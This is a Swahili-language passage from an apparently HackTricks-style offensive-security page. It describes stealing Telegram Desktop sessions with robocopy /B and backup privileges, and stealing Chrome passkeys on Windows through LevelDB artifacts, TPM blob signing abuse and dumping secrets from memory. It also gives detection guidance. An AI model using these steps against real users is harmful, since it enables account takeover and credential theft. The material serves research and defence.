Ikiwa usomaji wa kawaida hautafaulu na tokeni ya mchakato **tayari ina** `SeBackupPrivilege` **na imeiwezesha**, ufikiaji unaotambua backup hutoa njia mbadala; haupati privilege hiyo wala haupandishi kiwango cha ruhusa za mchakato. `CreateFileW` yenye `FILE_FLAG_BACKUP_SEMANTICS` inaweza kuomba semantiki za backup/restore na kupuuza ukaguzi wa usalama wa faili pale tokeni inapokuwa na privileges zinazohitajika, lakini flag hiyo pekee haiwezi kukwepa lock ya kushiriki isiyooana.<sup>[[10]](#references)[[11]](#references)</sup>

Kwa faili zilizo live na zimefungwa, unda/soma **Volume Shadow Copy**; kwa faili zilizozuiwa na ACL, `robocopy /B` hutumia hali ya backup na kupuuza ACL za faili na saraka.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Implant inayozingatia matumizi ya bandwidth inaweza kuwasilisha kwanza orodha ya njia za faili pekee, kupokea kitambulisho cha snapshot pamoja na njia ambazo C2 tayari imehifadhi, kisha kupakia faili zinazokosekana pekee. Kwa hiyo, uhamishaji mdogo wa hatua kwa hatua baada ya kuorodhesha `tdata` kwa kujirudia bado unaweza kuashiria wizi wa session uliofanikiwa.<sup>[[10]](#references)</sup>

### Ugunduzi na udhibiti

Linganisha ufikiaji wa kujirudia kwa `tdata` na mchakato usio wa Telegram pamoja na kuwezeshwa kwa `SeBackupPrivilege`, kufunguliwa kwa faili kwa kutumia backup semantics, shughuli za VSS, au mchakato mtoto `robocopy.exe` unaotumia `/B`. Pia tafuta uorodheshaji wa haraka wa `%APPDATA%` na `%LOCALAPPDATA%\Packages`, ukifuatiwa na miunganisho ya nje kutoka kwa mchakato huohuo. Baada ya kuvamiwa, tumia **Mipangilio → Vifaa** (au **Faragha na Usalama → Vipindi Vinavyotumika**) kusitisha sessions zisizotambulika; kuwezesha uthibitishaji wa hatua mbili pekee hakufuti idhini ambayo tayari imeibwa.<sup>[[10]](#references)[[13]](#references)</sup>

## Wizi wa passkeys / WebAuthn kutoka Chrome kwenye Windows

Ikiwa utekelezaji wa msimbo unapatikana kama **mtumiaji mwathiriwa** kwenye host ya Windows inayotumia **Chrome + passkeys zilizosawazishwa kupitia Google Password Manager**, passkeys huwa shabaha ya kuvutia baada ya unyonyaji hata **bila admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artifacts za ndani zinazovutia

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** huhifadhi rekodi za **`WebauthnCredentialSpecifics`** zilizowekwa katika muundo wa protobuf. Process inayoendeshwa na mtumiaji huyo huyo inaweza kuorodhesha **RP ID**, **username**, **credential ID**, na nyenzo ya ufunguo binafsi iliyosimbwa kwa passkeys zilizosawazishwa.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** huhifadhi hali ya uandikishaji wa kifaa cha ndani, kama vile **`wrapped_identity_private_key`** na siri iliyofungwa inayotumiwa kurejesha credentials zilizosawazishwa.<sup>[[4]](#references)</sup>

Uchunguzi wa haraka:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blob za ufunguo zilizofungwa kwa TPM bado zinaweza kutumiwa vibaya kama oracle ya ndani ya kusaini

Ikiwa kivinjari kitasafirisha ufunguo wa utambulisho unaotegemea TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blob hiyo katika hali inayoweza kufikiwa na mtumiaji, malware haihitaji kutoa ufunguo binafsi ghafi. Inaweza tu kuleta tena blob hiyo kwenye **mashine hiyo hiyo** na kuiomba TPM ya ndani isaini data inayodhibitiwa na mshambulizi:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Hii inamaanisha kuwa **ufungamanishaji wa maunzi huzuia uhamishaji nje ya kifaa, lakini hauzuii matumizi ya mtumiaji yuleyule kwenye endpoint iliyoathiriwa**.

### Njia za vitendo za matumizi mabaya

1. **Pass-ta-key / relay ya utambulisho wa kifaa**<sup>[[4]](#references)</sup>
   - Orodhesha `WebauthnCredentialSpecifics` kutoka LevelDB ya Chrome.
   - Anzisha kuingia kwa passkey na upate changamoto mpya ya WebAuthn.
   - Tumia blob ya `wrapped_identity_private_key` iliyoibwa kwenye TPM ya mwathiriwa kusaini binding ya ombi la cloud-authenticator.
   - Peleka assertion iliyorejeshwa kwa relying party.
   - Hili ni muhimu hasa pale RP inapokubali `userVerification=preferred` au inaposhindwa kukataa assertions zenye **`UV=0`**.
2. **Utekaji wa ufunguo wa UV unaosubiri**<sup>[[4]](#references)</sup>
   - Lazimisha kuanza tena usajili kwa kufuta `passkey_enclave_state` au kwa kutuma operesheni halali iliyosainiwa ya `device/forget`.
   - Ikiwa usajili unaiacha kifaa katika hali ya **`uv_key_pending`**, sajili ufunguo wa umma wa UV unaodhibitiwa na mshambulizi.
   - Ikiwa mtoa huduma hathibitishi attestation / asili ya maunzi salama ya ufunguo mpya wa UV, sahihi za baadaye kutoka kwa ufunguo wa mshambulizi zitachukuliwa kuwa **`UV=1`**.
3. **Wizi wa urejeshaji wa siri kuu / SDS**<sup>[[4]](#references)</sup>
   - Lazimisha urejeshaji au kujiunga tena ili Chrome ichukue siri kuu ya passkey iliyosawazishwa.
   - Fuatilia kuundwa upya/kurekebishwa kwa `passkey_enclave_state`, kisha dump kumbukumbu ya Chrome wakati **siri ya kikoa cha usalama (SDS)** iliyo wazi ipo kwenye kumbukumbu.
   - Tumia SDS iliyopatikana kusimbua sehemu zilizosimbwa katika kila rekodi ya `WebauthnCredentialSpecifics` na kurejesha funguo za faragha za WebAuthn zinazohamishika.

### Mawazo ya DFIR / ugunduzi

- Fuatilia **ufutaji/kuundwa upya** kwa `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Toa tahadhari kuhusu ufikiaji usio wa kawaida wa **`Sync Data\LevelDB`** ya Chrome kutoka kwa michakato isiyo ya kivinjari.
- Toa tahadhari kuhusu **dump za kumbukumbu za Chrome** au ufikiaji wa kutiliwa shaka wa kumbukumbu kati ya michakato.
- Chunguza maombi yanayojirudia ya **PIN ya urejeshaji ya Google Password Manager** au kuanza tena usajili kusikotarajiwa.
- Kumbuka kuwa WebAuthn **`signCount`** mara nyingi haina manufaa kwa passkeys zilizosawazishwa kwa sababu inaweza kubaki bila kubadilika; kwa hiyo, ugunduzi wa kawaida wa clone si madhubuti.



## References

- [1] [Unit 42 – Uchunguzi wa Operesheni za Miaka Mingi Zilizolenga Sekta Zenye Thamani Kubwa Bila Kugunduliwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Ulaghai wa Word VBA macro kupitia SMTP → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni ya Kijeshi ya Kisiri Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pitisha Passkey: Eneo Jipya la Mashambulizi katika Uthibitishaji Usiohitaji Nenosiri](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / hifadhi ya funguo ya CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Udukuzi wa Windows: Mashambulizi kwa Mifumo na Mitandao ya Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jinsi Hifadhi ya Data ya Active Directory Inavyofanya Kazi Hasa: Ndani ya NTDS.dit (Sehemu ya 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump ya Lsass ya Mbali ya Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho Yapanua Silaha Zake za Ujasusi wa Mtandaoni kwa Toolkit ya Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Kitendakazi cha CreateFileW na `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Hali ya kuhifadhi nakala ya Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Maswali Yanayoulizwa Mara kwa Mara ya Telegram – kusitisha vipindi vinavyotumika](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard na Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Ulinzi na Usimamizi wa Credentials](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - inputs zinazotumika na mwongozo wa haraka](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
